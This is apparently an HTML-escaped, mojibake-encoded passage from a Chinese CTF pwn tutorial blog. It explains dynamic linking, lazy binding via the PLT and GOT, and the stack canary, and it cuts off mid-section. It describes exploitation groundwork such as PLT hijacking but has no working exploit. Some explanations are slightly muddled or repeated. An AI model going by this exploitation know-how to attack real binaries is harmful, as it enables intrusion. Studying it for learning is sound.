&lt;h2 id=&#34;å»¶è¿Ÿç»‘å®šæœºåˆ¶&#34;&gt;å»¶è¿Ÿç»‘å®šæœºåˆ¶
&lt;/h2&gt;&lt;p&gt;åœ¨ä¸Šç« çš„elfæ–‡ä»¶ï¼Œçœ‹åˆ°äº†.gotå’Œ.pltæ–‡ä»¶ï¼Œç”¨äºåŠ¨æ€é“¾æ¥å‡½æ•°åœ°å€ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŠ¨æ€é“¾æ¥åº“&#34;&gt;åŠ¨æ€é“¾æ¥åº“
&lt;/h3&gt;&lt;p&gt;æˆ‘ä»¬ç¨‹åºå¼€å‘è¿‡ç¨‹ä¸­éƒ½ä¼šç”¨åˆ°ç³»ç»Ÿå‡½æ•°ï¼Œæ¯”å¦‚readï¼Œwriteï¼Œ openç­‰ç­‰ã€‚è¿™äº›ç³»ç»Ÿå‡½æ•°ä¸éœ€è¦æˆ‘ä»¬å®ç°,å› ä¸ºç³»ç»Ÿå·²ç»å¸®ä½ å®Œæˆè¿™äº›å·¥ä½œï¼Œåªéœ€è¦è°ƒç”¨å³å¯ï¼Œå­˜æ”¾è¿™äº›å‡½æ•°çš„åº“æ–‡ä»¶å°±æ˜¯åŠ¨æ€é“¾æ¥åº“ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯¹äºPWNæ¥è§¦åˆ°çš„åŠ¨æ€é“¾æ¥åº“å°±æ˜¯&lt;strong&gt;libc.so&lt;/strong&gt;æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘&#34;&gt;é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘
&lt;/h3&gt;&lt;p&gt;è¿™é‡Œæˆ‘ä»¬ä¸¾ä¸€ä¸ªä¾‹å­æ¥ç±»æ¯”&lt;em&gt;é™æ€ç¼–è¯‘ä¸åŠ¨æ€ç¼–è¯‘&lt;/em&gt;çš„æ¦‚å¿µï¼š&lt;/p&gt;
&lt;p&gt;å°æ˜è¦å¼€ä¸€ä¸ªé¤é¦†ï¼ˆprogramï¼‰ï¼Œé¤é¦†çš„èœå•ä¸Šæœ‰å‡ ç™¾ç§èœè‚´ï¼ˆå‡½æ•°ï¼‰ï¼Œå°æ˜çš„é¤é¦†æ¯å¤©éƒ½ä¼šæ¥å¾ˆå¤šé¡¾å®¢ï¼Œæ¯ä¸ªé¡¾å®¢ç‚¹çš„èœéƒ½å¯èƒ½ä¸ä¸€æ ·ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæ¯é“èœæ‰€éœ€è¦çš„é£Ÿæï¼ˆç³»ç»Ÿå‡½æ•°ï¼‰éƒ½ä¸ä¸€æ ·ï¼Œè¿™äº›é£Ÿæéƒ½å­˜æ”¾äºä»“åº“ï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆç°åœ¨é—®é¢˜æ¥äº†ï¼Œå°æ˜å¦‚ä½•ä¿è¯æ¯ä¸ªé¡¾å®¢ç‚¹çš„èœéƒ½èƒ½è¢«æ»¡è¶³å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ç§æ–¹å¼ï¼šå°æ˜æŠŠä»“åº“ä¸­æ‰€æœ‰çš„é£Ÿæéƒ½æ¬è¿›å¨æˆ¿ï¼ˆé™æ€ç¼–è¯‘ï¼‰è¿™æ—¶ï¼Œå°æ˜ä¸éœ€è¦æŒªåœ°æ–¹ï¼ˆé™æ€ï¼‰ï¼Œåªéœ€è¦åœ¨å¨æˆ¿ä¸­å°±å¯ä»¥å·¥ä½œï¼Œä½†æ˜¯
è¿™ä¼šå¸¦æ¥å†—ä½™ï¼Œå¯èƒ½å¨æˆ¿ä¸­çš„é£Ÿæå¾ˆå¤šéƒ½ç”¨ä¸ä¸Šã€‚é«˜æ•ˆ&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒç§æ–¹å¼ï¼šå°æ˜æ¯æ¬¡é‡åˆ°æ–°çš„æ‰€éœ€è¦çš„é£Ÿæï¼Œæ‰å»ä»“åº“å–ï¼ˆåŠ¨æ€ç¼–è¯‘ï¼‰ã€‚è¿™æ—¶ï¼Œå°æ˜å¯èƒ½æŒªåŠ¨çš„æ¯”è¾ƒé¢‘ç¹ï¼ˆåŠ¨æ€ï¼‰ï¼Œä½†æ˜¯å¯ä»¥ä¿è¯å¨æˆ¿é¢æ²¡é‚£ä¹ˆå¤šå¯èƒ½ç”¨ä¸åˆ°çš„ä¸œè¥¿ã€‚å…¨é¢&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å¯èƒ½ä¼šè°ƒç”¨è®¸è®¸å¤šå¤šçš„åº“å‡½æ•°ï¼Œè¿™äº›åº“å‡½æ•°åœ¨ä¸€æ¬¡è¿è¡Œè¿‡ç¨‹ä¸­ä¸èƒ½ä¿è¯å…¨éƒ¨è¢«è°ƒç”¨ã€‚&lt;/p&gt;
&lt;p&gt;é™æ€ç¼–è¯‘çš„æ€è·¯å°±æ˜¯å°†æ‰€æœ‰å¯èƒ½è¿è¡Œåˆ°çš„åº“å‡½æ•°ä¸€åŒç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚è¿™ä¸€æ–¹å¼çš„ä¼˜ç‚¹å°±åœ¨äºåœ¨ç¨‹åºè¿è¡Œä¸­ä¸éœ€è¦ä¾èµ–åŠ¨æ€é“¾æ¥åº“ã€‚é€‚ç”¨çš„åœºåˆå°±æ˜¯æ¯”å¦‚ä½ æœ¬åœ°ç¼–è¯‘çš„ç¨‹åºéœ€è¦çš„åŠ¨æ€é“¾æ¥åº“ç‰ˆæœ¬æ¯”è¾ƒç‰¹æ®Šï¼Œå¦‚æœåœ¨åˆ«çš„æœºå™¨ä¸Šè¿è¡Œå¯èƒ½å¯¹æ–¹åŠ¨æ€é“¾æ¥åº“ç‰ˆæœ¬å’Œä½ ä¸ä¸€æ ·ä¼šå‡ºbugï¼Œè¿™æ—¶å€™ç”¨é™æ€ç¼–è¯‘ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;ç¼ºç‚¹å°±æ˜¯å˜å¼‚è¿‡åç¨‹åºä½“ç§¯å¾ˆå¤§ï¼Œç¼–è¯‘é€Ÿåº¦ä¹Ÿå¾ˆæ…¢ã€‚&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºåŠ¨æ€ç¼–è¯‘ï¼Œä¼˜ç‚¹æ˜¯ç¼©å°äº†æ‰§è¡Œæ–‡ä»¶æœ¬èº«çš„ä½“ç§¯ï¼Œå¦ä¸€æ–¹é¢æ˜¯åŠ å¿«äº†ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœæœ¬åœ°çš„ç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;ç¼ºç‚¹æ˜¯ä½¿ç”¨é“¾æ¥åº“çš„å‘½ä»¤ï¼Œéœ€è¦é™„å¸¦ç›¸å¯¹åºå¤§çš„é“¾æ¥åº“ï¼Œå¦‚æœå…¶ä»–è®¡ç®—æœºæ²¡æœ‰å®‰è£…å¯¹äºçš„è¿è¡Œåº“ï¼Œåˆ™åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¸èƒ½è¿è¡Œã€‚&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;æ¬¸æ¬¸çœ‹å›å°æ˜ï¼Œä»–è¦é€‰ç¬¬äºŒç§æ–¹å¼ï¼ˆåŠ¨æ€ç¼–è¯‘ï¼‰ï¼Œä½†æ¯æ¬¡å»ä»“åº“æ‰¾é£Ÿæå¤ªéº»çƒ¦äº†ï¼Œè€Œä¸”ä»“åº“è¿™ä¹ˆå¤§ï¼Œï¼Œäºæ˜¯ä»–ç”¨å°æœ¬æœ¬è®°ä¸‹äº†åœ¨ä»“åº“çš„æ¯æ ·é£Ÿæçš„ä½ç½®ï¼ˆgotè¡¨ï¼‰ï¼Œä¸‹ä¸€æ¬¡æ‰¾è¿™ä»¶é£Ÿæå°±é«˜æ•ˆå¤šäº†ã€‚è¿™å°±æ˜¯gotã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;h4 id=&#34;å»¶è¿Ÿç»‘å®š&#34;&gt;å»¶è¿Ÿç»‘å®š
&lt;/h4&gt;&lt;p&gt;è¿™å°±æ˜¯linuxçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œè€Œå­˜æ”¾è¿™ä¸ªåœ°å€çš„å°æœ¬å­å°±æ˜¯gotè¡¨ã€‚gotè¡¨å…¨ç¨‹æ˜¯Global Offset Tableï¼Œä¹Ÿå°±æ˜¯&lt;strong&gt;å…¨å±€åç§»é‡è¡¨&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œgotè¡¨åˆå§‹å¹¶ä¸ä¿å­˜åº“å‡½æ•°çš„åœ°å€ï¼Œåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨è¿‡åï¼Œç¨‹åºæ‰å°†è¿™ä¸€åœ°å€ä¿å­˜åœ¨gotè¡¨ä¸­ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pltä¸got&#34;&gt;PLTä¸GOT
&lt;/h3&gt;&lt;p&gt;GOTï¼ˆGlobal Offset Tableï¼Œå…¨å±€åç§»è¡¨ï¼‰ï¼šæ•°æ®æ®µç”¨äºåœ°å€æ— å…³ä»£ç çš„ Linux ELF æ–‡ä»¶ä¸­ç¡®å®šå…¨å±€å˜é‡å’Œå¤–éƒ¨å‡½æ•°åœ°å€çš„è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;PLTï¼ˆProcedure Linkage Tableï¼Œç¨‹åºé“¾æ¥è¡¨ï¼‰ï¼š Linux ELF æ–‡ä»¶ä¸­ç”¨äº&lt;strong&gt;å»¶è¿Ÿç»‘å®š&lt;/strong&gt;çš„è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;ELF ä¸­æœ‰.gotå’Œ.plt.got ä¸¤ä¸ª GOT è¡¨ï¼Œgot è¡¨ç”¨äºå…¨å±€å˜é‡çš„å¼•ç”¨åœ°å€ï¼Œ.got.plt ç”¨äºä¿å­˜å‡½æ•°å¼•ç”¨çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;ä¸è®ºæ˜¯ç¬¬å‡ æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œç¨‹åºçœŸæ­£è°ƒç”¨çš„å…¶å®æ˜¯pltè¡¨ã€‚pltè¡¨å…¶å®æ˜¯ä¸€æ®µæ®µæ±‡ç¼–æŒ‡ä»¤æ„æˆã€‚&lt;/p&gt;
&lt;h4 id=&#34;plt-å·¥ä½œæµç¨‹&#34;&gt;PLT å·¥ä½œæµç¨‹
&lt;/h4&gt;&lt;p&gt;åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼Œpltè¡¨é¦–å…ˆä¼šè·³åˆ°å¯¹åº”çš„gotè¡¨é¡¹ä¸­ã€‚ç”±äºå¹¶æ²¡æœ‰è¢«è°ƒç”¨è¿‡ï¼Œæ­¤æ—¶çš„gotè¡¨å­˜å‚¨çš„ä¸æ˜¯ç›®æ ‡å‡½æ•°åœ°å€ï¼Œæ­¤æ—¶çš„gotè¡¨ä¸­å­˜å‚¨çš„åœ°å€æ˜¯ptè¡¨ä¸­çš„ä¸€æ®µæŒ‡ä»¤ï¼Œå…¶ä½œç”¨å°±æ˜¯å‡†å¤‡ä¸€äº›å‚æ•°ï¼Œè¿›è¡ŒåŠ¨æ€è§£æã€‚è·³è½¬å›pltè¡¨åï¼Œpltè¡¨åˆä¼šè·³è½¬å›pltçš„è¡¨å¤´ï¼Œè¡¨å¤´å†…å®¹å°±æ˜¯è°ƒç”¨åŠ¨æ€è§£æå‡½æ•°ï¼Œå°†ç›®æ ‡å‡½æ•°åœ°å€å­˜æ”¾å…¥gotè¡¨ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œä»¥è°ƒç”¨Cè¯­è¨€çš„printfä¸ºä¾‹å­å»è¯¦ç»†è®²è§£ï¼š&lt;/p&gt;
&lt;p&gt;1ã€è°ƒç”¨æ—¶ï¼Œæ±‡ç¼–è¯­è¨€æ‰§è¡Œåˆ°call printfæ—¶ï¼Œå…ˆè·³å‘PLTè¡¨ä¸­printfå¯¹åº”çš„æ¡ç›®ï¼ˆplt[printf]ï¼‰ï¼Œè¿™ä¹ˆè¯´å¥½åƒèµ·åˆ°jmpè·³è½¬åœ°å€çš„ä½œç”¨å•Šã€‚åªæ˜¯ç±»ä¼¼ï¼Œå¹¶æœªè·³è½¬åœ°å€ï¼Œè€Œæ­¤æ—¶ç¼–è¯‘è¿˜ä¸çŸ¥é“ï¼Œè€Œæ˜¯å…ˆè·³è½¬PLTè¡¨ä¸­ä½è¯¥å‡½æ•°é¢„ç•™çš„ä¸€ä¸ªâ€å°è·³æ¿â€œï¼ˆplt[printf]ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;2ã€**plt[printf]**ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œæ­¤æ—¶GOTè¡¨ä¸­è¿˜æ²¡è¢«å¡«å……çœŸå®åœ°å€ï¼ˆå› ä¸ºæ­¤å‰æ²¡æœ‰è¢«è§£æè¿‡ï¼‰ï¼Œæ‰€ä»¥é‡Œå¤´å¹¶ä¸æ˜¯printfçš„çœŸå®åœ°å€ï¼Œè€Œæ˜¯plt[printf]ä¸­ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯jmp*GOT[printf]ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;call printf&lt;/code&gt; â†’ è·³å‘&lt;code&gt;plt[printf]&lt;/code&gt; â†’ æ‰§è¡Œ&lt;code&gt;jmp *GOT[printf]&lt;/code&gt; â†’ æ­¤æ—¶&lt;code&gt;GOT[printf]&lt;/code&gt;é‡Œå·²æ˜¯çœŸå®åœ°å€ï¼Œç›´æ¥è·³è¿‡å»æ‰§è¡Œã€‚æ­¤æ—¶å°±çŸ¥é“printfçš„çœŸå®åœ°å€äº†ã€‚&lt;/p&gt;
&lt;p&gt;3ã€**è·³å›PLTåï¼Œæ‰§è¡Œâ€å‡†å¤‡è§£æå‚æ•°â€œçš„æŒ‡ä»¤ã€‚**plt[printf]çš„ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯å‡†å¤‡åŠ¨æ€è§£æéœ€è¦çš„å‚æ•°ï¼šæ¯”å¦‚æŠŠprintfå¯¹åº”çš„ç¬¦å·ç´¢å¼•ï¼ˆç”¨äºå‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨ â€œè¦è§£æå“ªä¸ªå‡½æ•°â€ï¼‰å‹å…¥æ ˆä¸­ã€‚è¿™äº›å‚æ•°æ˜¯æå‰åœ¨ç¼–è¯‘æ—¶å°±å†™å¥½çš„ï¼Œç›®çš„æ˜¯å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨ â€œæˆ‘è¦æ‰¾çš„æ˜¯printfï¼Œå¸®æˆ‘æŸ¥å®ƒçš„çœŸå®åœ°å€â€ã€‚è¿™äº›å‚æ•°æ˜¯æå‰åœ¨ç¼–è¯‘æ—¶å°±å†™å¥½çš„ï¼Œç›®çš„æ˜¯å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨ â€œæˆ‘è¦æ‰¾çš„æ˜¯printfï¼Œå¸®æˆ‘æŸ¥å®ƒçš„çœŸå®åœ°å€â€ã€‚&lt;/p&gt;
&lt;p&gt;4ã€**è·³å‘PLTè¡¨å¤´ï¼ˆplt[0]ï¼‰ï¼Œè§¦å‘åŠ¨æ€é“¾æ¥å™¨çš„è§£æå‡½æ•°ã€‚**å‡†å¤‡å¥½å‚æ•°åï¼Œplt[printf]ä¼šè·³å‘ PLT è¡¨çš„ â€œè¡¨å¤´â€ï¼ˆplt[0]ï¼‰ã€‚plt[0]é‡Œçš„æŒ‡ä»¤æ˜¯å›ºå®šçš„ï¼šå…ˆæŠŠGOT[0]çš„åœ°å€å‹æ ˆï¼ˆGOT[0]å­˜å‚¨ç€åŠ¨æ€é“¾æ¥å™¨éœ€è¦çš„è¾…åŠ©ä¿¡æ¯ï¼‰ï¼Œç„¶åè°ƒç”¨åŠ¨æ€é“¾æ¥å™¨çš„æ ¸å¿ƒè§£æå‡½æ•°ï¼ˆ_dl_runtime_resolveï¼‰ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ï¼Ÿï¼Ÿï¼Ÿè¿™æœ‰ä¸ªç–‘é—®ï¼Œæ€ä¹ˆä¼šæœ‰å‡½æ•°æ¥å¸®åŠ©å¤–éƒ¨å‡½æ•°å¦‚printfå»ç¡®å®šåœ°å€å‘¢ï¼Ÿå…¶å®è¿™ä¸ª&lt;code&gt;_dl_runtime_resolve&lt;/code&gt;å‡½æ•°æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯åŠ¨æ€é“¾æ¥å™¨çš„ç»„æˆéƒ¨åˆ†ï¼Œæ˜¯å·²ç»é¢„å…ˆå­˜åœ¨äºåŠ¨æ€é“¾æ¥å™¨çš„ä»£ç ä¹‹ä¸­çš„ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¸€åŠ è½½ï¼Œå®ƒçš„åœ°å€å°±è¢«å…ˆè§£æå‡ºæ¥äº†ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;5ã€&lt;strong&gt;åŠ¨æ€é“¾æ¥å™¨è§£æå‡ºçœŸå®åœ°å€ï¼Œå†™å…¥ GOT è¡¨ï¼Œå®Œæˆç»‘å®š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯ç”¨æ±‡ç¼–è¯­è¨€ä»£ç æ¥æ¦‚æ‹¬è¿™äº”æ­¥æµç¨‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;GOT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;; ç¬¬1è¡Œï¼šè·³å‘GOT[printf]å­˜å‚¨çš„åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x123&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;; ç¬¬2è¡Œï¼šå‹å…¥printfçš„ç¬¦å·ç´¢å¼•ï¼ˆå‡è®¾æ˜¯0x123ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; ç¬¬3è¡Œï¼šè·³å‘PLTè¡¨å¤´&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™äº”æ­¥ä¹Ÿå°±ç³»ç»Ÿæ¦‚æ‹¬äº†å°æ˜åœ¨å¨æˆ¿åšèœéº»çƒ¦éœ€è¦ç”¨å°æœ¬æœ¬è®°ä¸‹ä»“åº“çš„æ‰€éœ€é£Ÿæçš„å­˜æ”¾åœ°æ–¹ï¼ˆåœ°å€ï¼‰çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ€»ç»“ï¼šPLT å’Œ GOT çš„åä½œæ ¸å¿ƒ&lt;/p&gt;
&lt;p&gt;PLT æ˜¯ â€œè·³æ¿â€ï¼šè´Ÿè´£ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶è§¦å‘è§£ææµç¨‹ï¼Œåç»­è°ƒç”¨æ—¶ç›´æ¥è½¬å‘åˆ° GOT ä¸­çš„çœŸå®åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;GOT æ˜¯ â€œç¼“å­˜è¡¨â€ï¼šç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶å­˜å‚¨ PLT å†…çš„è·³è½¬åœ°å€ï¼ˆç”¨äºè§¦å‘è§£æï¼‰ï¼Œè§£æåå­˜å‚¨å‡½æ•°çœŸå®åœ°å€ï¼ˆä¾›åç»­ç›´æ¥è°ƒç”¨ï¼‰ã€‚
æ•´ä¸ªæœºåˆ¶çš„ç›®çš„æ˜¯ &lt;strong&gt;â€œå»¶è¿Ÿè§£æâ€&lt;/strong&gt;ï¼šé¿å…ç¨‹åºå¯åŠ¨æ—¶è§£ææ‰€æœ‰å¤–éƒ¨å‡½æ•°ï¼ˆè€—æ—¶ï¼‰ï¼Œåªåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶è§£æï¼Œå¹³è¡¡å¯åŠ¨é€Ÿåº¦å’Œè¿è¡Œæ•ˆç‡ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;ç†è§£äº†è¿™ä¸ªæµç¨‹ï¼Œå°±æŒæ¡äº†åŠ¨æ€é“¾æ¥ä¸­æœ€æ ¸å¿ƒçš„ â€œæ‡’ç»‘å®šâ€ æœºåˆ¶ï¼Œè¿™ä¹Ÿæ˜¯ CTFpwn ä¸­ â€œ&lt;strong&gt;PLT åŠ«æŒ&lt;/strong&gt;â€ ç­‰æ¼æ´åˆ©ç”¨çš„åŸºç¡€ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶&#34;&gt;Linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶
&lt;/h2&gt;&lt;p&gt;æ ˆæº¢å‡ºã€æŒ‡é’ˆæ‚¬æŒ‚ã€å†…å­˜åœ°å€æ³„éœ²ç­‰Bugä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œä¸€äº›æ”»å‡»è€…ä¼šåˆ»æ„åˆ¶é€ è¿™äº›æ¼æ´æ¥æ‰°ä¹±ç¨‹åºæ­£å¸¸æ‰§è¡Œï¼Œè¿™å°±æ˜¯æ—©æœŸPWNçš„å¨åŠ›ã€‚è¿™ä¸€ç« æ¯”è¾ƒé‡è¦ï¼Œå‡ ä¹è´¯ç©¿åç»­æ ˆæº¢å‡ºã€å †çš„é¢˜ç›®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¿æŠ¤æœºåˆ¶&#34;&gt;ä¿æŠ¤æœºåˆ¶
&lt;/h3&gt;&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;CANARYã€NXã€ASRLã€PIEã€RELRO&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æ ˆçš„ä½œç”¨ä¸ºå­˜å‚¨å‡½æ•°è°ƒç”¨ç›¸å…³ä¿¡æ¯ä»¥åŠå‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;è¿™äº›å±€éƒ¨å˜é‡é€šå¸¸ä¸ºæ•°ç»„æˆ–è€…è¾“å…¥çš„ç¼“å†²åŒºï¼ˆbufï¼‰ã€‚è€Œå‡½æ•°è°ƒç”¨ç›¸å…³çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯è¿”å›åœ°å€å’Œæ ˆåº•æŒ‡é’ˆï¼ˆrbpï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;canary&#34;&gt;CANARY
&lt;/h3&gt;&lt;p&gt;Canaryä¸­æ–‡ç¿»è¯‘å°±æ˜¯é‡‘ä¸é›€ï¼Œæ¥æºæ˜¯ä¹‹å‰ç§‘æŠ€ä¸å‘è¾¾æ—¶ï¼ŒçŸ¿å·¥ä¼šåœ¨ä¸‹äº•ä½œä¸šæ—¶å¸¦ä¸€ä¸ªé‡‘ä¸é›€ï¼Œç”¨æ¥åˆ¤æ–­åœ°ä¸‹ç¯å¢ƒæœ‰æ²¡æœ‰ç…¤æ°”ä¹‹ç±»çš„æ¯’æ°”æ³„æ¼ï¼Œé‡‘ä¸é›€æ²¡äº‹ï¼Œå¤§å®¶ç»§ç»­å¹²æ´»ï¼›é‡‘ä¸é›€å¦‚æœæ­»äº†ï¼Œå¤§å®¶èµ¶ç´§è·‘ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Linuxä¸­ï¼ŒCanaryçš„ä½œç”¨å°±å¦‚åŒä»–å¼•ç”¨çš„ä¸€æ ·ï¼Œç”¨æ¥åˆ¤æ–­ç¨‹åºçš„æ‰§è¡Œç¯å¢ƒï¼Œä¸»è¦æ˜¯é’ˆå¯¹æ£€æµ‹&lt;strong&gt;æ ˆæº¢å‡º&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;canaryæ˜¯ä¸€ä¸ªå¼€å¤´å­—èŠ‚ä¸º\x00çš„ä¸€æ®µé•¿åº¦ä¸ºå…«ä¸ªå­—èŠ‚(x64)çš„éšæœºæ•°ï¼Œè¿™ä¸ªéšæœºæ•°æœ¬ä½“å­˜æ”¾äº fs æ®µåç§»ä¸º 0x28 çš„åŒºåŸŸã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨æ¯æ¬¡å‡½æ•°è°ƒç”¨ä¸­ï¼Œç¨‹åºéƒ½ä¼šå°†è¿™æ®µéšæœºæ•°å­˜æ”¾äºæ ˆåº•ï¼Œæ¯æ¬¡è¿è¡Œç»“æŸè¿”å›æ—¶ï¼Œéƒ½ä¼šå°†è¿™ä¸€éšæœºæ•°ä¸ä»–çš„æœ¬ä½“è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœè¿™ä¸ªå€¼è¢«æ”¹å˜ï¼Œåˆ™æ„å‘³ç€å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œç¨‹åºç›´æ¥é€€å‡ºï¼Œæ²¡æœ‰æ”¹å˜çš„è¯ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/12.png&#34;
	width=&#34;819&#34;
	height=&#34;431&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/12_hu_e74b0eb1f3623cc7.png 480w, https://expl0rer.top/p/pwn-1/12_hu_d9ea985ab2966894.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Canaryç¤ºä¾‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
